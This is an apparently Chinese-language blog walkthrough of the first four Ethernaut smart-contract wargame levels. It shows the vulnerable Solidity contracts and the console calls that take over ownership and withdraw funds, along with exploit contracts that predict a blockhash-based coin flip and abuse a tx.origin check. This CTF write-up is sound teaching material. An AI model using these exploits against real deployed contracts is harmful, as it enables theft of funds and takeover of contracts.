@@ -1,0 +1,837 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="平台地址 1. Fallback闯关要求 成为合约的owner 将余额减少为0  合约代码123456789101112131415161718192021222324252627282930313233343536373839404142434445&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openze">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut闯关（上）">
+<meta property="og:url" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="平台地址 1. Fallback闯关要求 成为合约的owner 将余额减少为0  合约代码123456789101112131415161718192021222324252627282930313233343536373839404142434445&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &amp;#x27;@openze">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128141052114.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128155228067.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209220508976.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209221813609.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220216172446013.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221164154258.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220227152252411.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220221221632944.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223155339055.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161137206.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/918b31ad3155cfc4d5e4bdd4e9841d5.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161340419.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223161409985.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220836386.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223220944150.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221109151.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220223221202590.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201600577.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224171227027.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201734086.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224201803486.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224190112002.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224214603113.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220625238.png">
+<meta property="og:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220224220653313-16459470826481.png">
+<meta property="article:published_time" content="2022-02-27T07:29:15.000Z">
+<meta property="article:modified_time" content="2022-08-15T13:32:41.447Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="靶场刷题">
+<meta property="article:tag" content="Etherum">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128141052114.png">
+  
+  
+  
+  <title>Ethernaut闯关（上） - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Ethernaut闯关（上）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-02-27 15:29" pubdate>
+          February 27, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          136 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Ethernaut闯关（上）</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><a target="_blank" rel="noopener" href="https://ethernaut.zeppelin.solutions/">平台地址</a></p>
+<h2 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h2><h3 id="闯关要求"><a href="#闯关要求" class="headerlink" title="闯关要求"></a>闯关要求</h3><ul>
+<li>成为合约的owner</li>
+<li>将余额减少为0</li>
+</ul>
+<h3 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Fallback &#123;<br><br>  using SafeMath for uint256;<br>  mapping(address =&gt; uint) public contributions;<br>  address payable public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>    contributions[msg.sender] = 1000 * (1 ether);<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>        require(<br>            msg.sender == owner,<br>            &quot;caller is not the owner&quot;<br>        );<br>        _;<br>    &#125;<br><br>  function contribute() public payable &#123;<br>    require(msg.value &lt; 0.001 ether);<br>    contributions[msg.sender] += msg.value;<br>    if(contributions[msg.sender] &gt; contributions[owner]) &#123;<br>      owner = msg.sender;<br>    &#125;<br>  &#125;<br><br>  function getContribution() public view returns (uint) &#123;<br>    return contributions[msg.sender];<br>  &#125;<br><br>  function withdraw() public onlyOwner &#123;<br>    owner.transfer(address(this).balance);<br>  &#125;<br><br>  receive() external payable &#123;<br>    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);<br>    owner = msg.sender;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析"><a href="#合约分析" class="headerlink" title="合约分析"></a>合约分析</h3><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
+<li><p>首先点击”Get new instance”来获取一个实例</p>
+</li>
+<li><p>查看合约地址的资产总量</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">await</span> <span class="hljs-function"><span class="hljs-title">getBlance</span>(<span class="hljs-variable">instance</span>)</span><br></code></pre></td></tr></table></figure></li>
+<li><p>向合约转1wei，使贡献值大于0</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">await</span> contract.contribute(&#123;value:<span class="hljs-number">1</span>&#125;)<br></code></pre></td></tr></table></figure></li>
+<li><p>再次获取balance，检查是否成功改变</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">await</span> <span class="hljs-function"><span class="hljs-title">getBlance</span>(<span class="hljs-variable">instance</span>)</span><br></code></pre></td></tr></table></figure></li>
+<li><p>通过调用sendTransaction函数来触发fallback函数</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">await contract.send<span class="hljs-constructor">Transaction(&#123;<span class="hljs-params">value</span>:1&#125;)</span><br></code></pre></td></tr></table></figure></li>
+<li><p>等交易完成后再次查看合约的owner，发现成功变为我们自己的地址</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">await</span> contract.owner()<br></code></pre></td></tr></table></figure></li>
+<li><p>调用withdraw来转走合约的所有代币</p>
+<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">await</span> contract.withdraw()<br></code></pre></td></tr></table></figure></li>
+<li><p>点击”submit instance”即可完成闯关</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128141052114.png" srcset="/img/loading.gif" lazyload alt="image-20220128141052114"></p>
+</li>
+</ol>
+<h2 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h2><h3 id="闯关要求-1"><a href="#闯关要求-1" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>获得合约所有权</p>
+<h3 id="合约代码-1"><a href="#合约代码-1" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract Fallout &#123;<br>  <br>  using SafeMath for uint256;<br>  mapping (address =&gt; uint) allocations;<br>  address payable public owner;<br><br><br>  // constructor <br>  function Fal1out() public payable &#123;<br>    owner = msg.sender;<br>    allocations[owner] = msg.value;<br>  &#125;<br><br>  modifier onlyOwner &#123;<br>	        require(<br>	            msg.sender == owner,<br>	            &quot;caller is not the owner&quot;<br>	        );<br>	        _;<br>	    &#125;<br><br>  function allocate() public payable &#123;<br>    allocations[msg.sender] = allocations[msg.sender].add(msg.value);<br>  &#125;<br><br>  function sendAllocation(address payable allocator) public &#123;<br>    require(allocations[allocator] &gt; 0);<br>    allocator.transfer(allocations[allocator]);<br>  &#125;<br><br>  function collectAllocations() public onlyOwner &#123;<br>    msg.sender.transfer(address(this).balance);<br>  &#125;<br><br>  function allocatorBalance(address allocator) public view returns (uint) &#123;<br>    return allocations[allocator];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-1"><a href="#合约分析-1" class="headerlink" title="合约分析"></a>合约分析</h3><p>构造函数名称与合约名称不一致，同时在构造函数中指定了函数调用者直接为合约的owner</p>
+<h3 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3><ol>
+<li><p>点击“Get new instance”来获取示例</p>
+</li>
+<li><p>调用构造函数来更换owner</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">await</span> contract.Fal<span class="hljs-number">1</span>out()<br></code></pre></td></tr></table></figure></li>
+<li><p>点击“submit instance”来提交答案</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220128155228067.png" srcset="/img/loading.gif" lazyload alt="image-20220128155228067"></p>
+</li>
+</ol>
+<h2 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h2><h3 id="闯关要求-2"><a href="#闯关要求-2" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。</p>
+<h3 id="合约代码-2"><a href="#合约代码-2" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;<br><br>contract CoinFlip &#123;<br><br>  using SafeMath for uint256;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  constructor() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(blockhash(block.number.sub(1)));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue.div(FACTOR);<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-2"><a href="#合约分析-2" class="headerlink" title="合约分析"></a>合约分析</h3><p><a target="_blank" rel="noopener" href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620">随机数问题</a></p>
+<p>这题就是用了<code>block.blockhash(block.number-1)</code>，这个表示上一块的hash，然后去除以<code>2^255</code></p>
+<h3 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.18;<br>contract CoinFlip &#123;<br>  uint256 public consecutiveWins;<br>  uint256 lastHash;<br>  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>  function CoinFlip() public &#123;<br>    consecutiveWins = 0;<br>  &#125;<br><br>  function flip(bool _guess) public returns (bool) &#123;<br>    uint256 blockValue = uint256(block.blockhash(block.number-1));<br><br>    if (lastHash == blockValue) &#123;<br>      revert();<br>    &#125;<br><br>    lastHash = blockValue;<br>    uint256 coinFlip = blockValue/FACTOR;<br>    bool side = coinFlip == 1 ? true : false;<br><br>    if (side == _guess) &#123;<br>      consecutiveWins++;<br>      return true;<br>    &#125; else &#123;<br>      consecutiveWins = 0;<br>      return false;<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    address public con_addr = 0x50F027e7e09791A2DbC86E38AbdC1f8FE41d7A9B; //此处是实例地址<br>    CoinFlip expFlip = CoinFlip(con_addr);<br>    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;<br><br>    function guess() public &#123;<br>        uint256 blockValue = uint256(block.blockhash(block.number-1));<br>        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);<br>        bool guess = coinFlip == 1 ? true : false;<br>        expFlip.flip(guess);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在remix中部署合约，并点击guess十次</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209220508976.png" srcset="/img/loading.gif" lazyload alt="image-20220209220508976"></p>
+<p>期间可使用 <code>await contract.consecutiveWins()</code> 来查询成功次数</p>
+<p><img src="/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/image-20220209221813609.png" srcset="/img/loading.gif" lazyload alt="image-20220209221813609"></p>
+<h2 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h2><h3 id="闯关要求-3"><a href="#闯关要求-3" class="headerlink" title="闯关要求"></a>闯关要求</h3><p>获取合约的owner权限</p>
+<h3 id="合约代码-3"><a href="#合约代码-3" class="headerlink" title="合约代码"></a>合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="合约分析-3"><a href="#合约分析-3" class="headerlink" title="合约分析"></a>合约分析</h3><p>这里涉及到了tx.origin和msg.sender的区别，前者表示交易的发送者，后者则表示消息的发送者，如果情景是在一个合约下的调用，那么这两者是木有区别的，但是如果是在多个合约的情况下，比如用户通过A合约来调用B合约，那么对于B合约来说，msg.sender就代表合约A，而tx.origin就代表用户</p>
+<h3 id="攻击流程-3"><a href="#攻击流程-3" class="headerlink" title="攻击流程"></a>攻击流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br><br>contract Telephone &#123;<br><br>  address public owner;<br><br>  constructor() public &#123;<br>    owner = msg.sender;<br>  &#125;<br><br>  function changeOwner(address _owner) public &#123;<br>    if (tx.origin != msg.sender) &#123;<br>      owner = _owner;<br>    &#125;<br>  &#125;<br>&#125;<br><br>contract exploit &#123;<br>    Telephone target = Telephone(0x2b5e81876E14b3E0E1337F6BA7bc4A2d8844c904);//实例地址<br><br>    function attack() public &#123;<br>        target.changeOwner(0x9DC97146b924263A2c8C7237FbeEAFb6ef60b624);//自己的地址<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可使用<code>await contract.owner()</code>来查询合约的owner</p>
